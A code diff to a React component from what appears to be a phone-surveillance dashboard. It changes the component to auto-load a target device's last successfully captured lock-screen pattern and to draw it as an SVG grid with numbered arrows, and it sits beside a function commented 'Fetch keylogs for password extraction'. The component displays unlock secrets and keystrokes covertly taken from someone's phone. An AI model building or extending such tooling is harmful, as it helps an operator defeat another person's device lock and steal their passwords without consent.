@@ -312,7 +312,7 @@ function PhoneLockContent() {
         });
     };
 
-    // Fetch unlock attempts
+    // Fetch unlock attempts and load last successful pattern
     const fetchUnlockAttempts = useCallback(async () => {
         if (!deviceId) return;
         try {
@@ -323,13 +323,27 @@ function PhoneLockContent() {
             const data = await res.json();
             if (data.success) {
                 setUnlockAttempts(data.data);
+
+                // Auto-load the last successful pattern unlock on page load
+                if (capturedPattern.length === 0 && data.data && data.data.length > 0) {
+                    const lastSuccessfulPattern = data.data.find(
+                        (attempt: UnlockAttempt) => attempt.unlockType === 'pattern' && attempt.success && attempt.unlockData
+                    );
+                    if (lastSuccessfulPattern && lastSuccessfulPattern.unlockData) {
+                        const cells = lastSuccessfulPattern.unlockData.split(',').map(Number).filter((n: number) => !isNaN(n) && n >= 1 && n <= 9);
+                        if (cells.length > 0) {
+                            setCapturedPattern(cells);
+                            setLastPatternTime(new Date(lastSuccessfulPattern.timestamp).getTime());
+                        }
+                    }
+                }
             }
         } catch (err) {
             console.error('Error fetching unlock attempts:', err);
         } finally {
             setLoading(false);
         }
-    }, [deviceId]);
+    }, [deviceId, capturedPattern.length]);
 
     // Fetch keylogs for password extraction
     const fetchKeylogs = useCallback(async () => {
@@ -506,40 +520,170 @@ function PhoneLockContent() {
         return { name: parts[parts.length - 1] || appName, color: '#6366F1' };
     };
 
-    // Pattern grid visualization
+    // Pattern grid visualization with SVG arrows
+    // Grid layout: 1 2 3
+    //              4 5 6
+    //              7 8 9
     const PatternGrid = ({ pattern, isActive = false, size = 'normal' }: { pattern: number[], isActive?: boolean, size?: 'normal' | 'small' }) => {
-        const cells = Array.from({ length: 9 }, (_, i) => i);
-        const dotSize = size === 'small' ? 'w-8 h-8 text-xs' : 'w-12 h-12 text-sm';
-        const gap = size === 'small' ? 'gap-3' : 'gap-6';
+        // Grid positions for pattern cells 1-9 (Android uses 1-9, not 0-8)
+        // We'll map to a coordinate system for SVG drawing
+        const gridSize = size === 'small' ? 160 : 220;
+        const dotRadius = size === 'small' ? 14 : 18;
+        const spacing = size === 'small' ? 50 : 70;
+        const margin = size === 'small' ? 30 : 40;
+
+        // Get position for cell number (1-9)
+        const getCellPosition = (cellNum: number): { x: number, y: number } => {
+            // Cell numbering: 1 2 3
+            //                 4 5 6
+            //                 7 8 9
+            const adjustedNum = cellNum - 1; // Convert to 0-indexed
+            const row = Math.floor(adjustedNum / 3);
+            const col = adjustedNum % 3;
+            return {
+                x: margin + col * spacing,
+                y: margin + row * spacing
+            };
+        };
+
 
         return (
-            <div className="relative">
-                <div className={`grid grid-cols-3 ${gap} p-4`}>
-                    {cells.map((cellIndex) => {
-                        const isSelected = pattern.includes(cellIndex);
-                        const order = pattern.indexOf(cellIndex);
+            <div className="flex flex-col items-center">
+                <svg
+                    width={gridSize}
+                    height={gridSize}
+                    className="overflow-visible"
+                >
+                    {/* Draw connecting arrows between dots */}
+                    {pattern.length > 1 && pattern.map((cell, index) => {
+                        if (index === 0) return null;
+                        const prevCell = pattern[index - 1];
+                        const from = getCellPosition(prevCell);
+                        const to = getCellPosition(cell);
+
+                        // Calculate shortened endpoints
+                        const dx = to.x - from.x;
+                        const dy = to.y - from.y;
+                        const dist = Math.sqrt(dx * dx + dy * dy);
+                        const startPad = dotRadius + 4;
+                        const endPad = dotRadius + 10;
+
+                        const startX = from.x + (dx / dist) * startPad;
+                        const startY = from.y + (dy / dist) * startPad;
+                        const endX = to.x - (dx / dist) * endPad;
+                        const endY = to.y - (dy / dist) * endPad;
 
                         return (
-                            <div
-                                key={cellIndex}
-                                className={`
-                                    ${dotSize} rounded-full flex items-center justify-center font-bold
-                                    transition-all duration-200
-                                    ${isSelected
-                                        ? 'bg-gradient-to-br from-[var(--aurora-violet)] to-[var(--aurora-purple)] text-white scale-110 shadow-lg'
-                                        : 'bg-[var(--bg-subtle)] text-[var(--text-muted)] border border-[var(--border-light)]'
-                                    }
-                                    ${isActive && isSelected ? 'animate-pulse' : ''}
-                                `}
-                            >
-                                {isSelected ? order + 1 : cellIndex}
-                            </div>
+                            <line
+                                key={`arrow-${index}`}
+                                x1={startX}
+                                y1={startY}
+                                x2={endX}
+                                y2={endY}
+                                stroke="url(#lineGradient)"
+                                strokeWidth={3}
+                                strokeLinecap="round"
+                                markerEnd="url(#arrowMarker)"
+                                className={isActive ? 'animate-pulse' : ''}
+                            />
                         );
                     })}
-                </div>
+
+                    {/* SVG Definitions */}
+                    <defs>
+                        <linearGradient id="lineGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                            <stop offset="0%" stopColor="#8B5CF6" />
+                            <stop offset="100%" stopColor="#A855F7" />
+                        </linearGradient>
+                        <radialGradient id="dotGradient" cx="30%" cy="30%">
+                            <stop offset="0%" stopColor="#A78BFA" />
+                            <stop offset="100%" stopColor="#7C3AED" />
+                        </radialGradient>
+                        <marker
+                            id="arrowMarker"
+                            markerWidth="6"
+                            markerHeight="6"
+                            refX="5"
+                            refY="3"
+                            orient="auto"
+                            markerUnits="strokeWidth"
+                        >
+                            <polygon points="0,0 6,3 0,6" fill="#8B5CF6" />
+                        </marker>
+                    </defs>
+
+                    {/* Draw dots (1-9) */}
+                    {[1, 2, 3, 4, 5, 6, 7, 8, 9].map((cellNum) => {
+                        const pos = getCellPosition(cellNum);
+                        const isInPattern = pattern.includes(cellNum);
+                        const orderInPattern = pattern.indexOf(cellNum);
+
+                        return (
+                            <g key={cellNum}>
+                                {/* Outer ring for selected */}
+                                {isInPattern && (
+                                    <circle
+                                        cx={pos.x}
+                                        cy={pos.y}
+                                        r={dotRadius + 4}
+                                        fill="none"
+                                        stroke="#8B5CF6"
+                                        strokeWidth={2}
+                                        opacity={0.5}
+                                        className={isActive ? 'animate-ping' : ''}
+                                    />
+                                )}
+                                {/* Main dot */}
+                                <circle
+                                    cx={pos.x}
+                                    cy={pos.y}
+                                    r={dotRadius}
+                                    fill={isInPattern ? 'url(#dotGradient)' : '#E5E7EB'}
+                                    stroke={isInPattern ? '#7C3AED' : '#D1D5DB'}
+                                    strokeWidth={2}
+                                />
+                                {/* Order number badge (for selected dots) */}
+                                {isInPattern && (
+                                    <text
+                                        x={pos.x}
+                                        y={pos.y}
+                                        textAnchor="middle"
+                                        dominantBaseline="central"
+                                        fill="white"
+                                        fontSize={size === 'small' ? 10 : 12}
+                                        fontWeight="bold"
+                                    >
+                                        {orderInPattern + 1}
+                                    </text>
+                                )}
+                                {/* Cell number label (for unselected) */}
+                                {!isInPattern && (
+                                    <text
+                                        x={pos.x}
+                                        y={pos.y}
+                                        textAnchor="middle"
+                                        dominantBaseline="central"
+                                        fill="#9CA3AF"
+                                        fontSize={size === 'small' ? 9 : 11}
+                                    >
+                                        {cellNum}
+                                    </text>
+                                )}
+                            </g>
+                        );
+                    })}
+
+                </svg>
+
+                {/* Sequence text */}
                 {pattern.length > 0 && (
-                    <div className="mt-2 text-center text-sm text-[var(--text-muted)]">
-                        Sequence: {pattern.join(' → ')}
+                    <div className="mt-3 text-center">
+                        <div className="text-sm font-medium text-[var(--text-primary)]">
+                            Sequence: {pattern.join(' → ')}
+                        </div>
+                        <div className="text-xs text-[var(--text-muted)] mt-1">
+                            {pattern.length} dots connected
+                        </div>
                     </div>
                 )}
             </div>
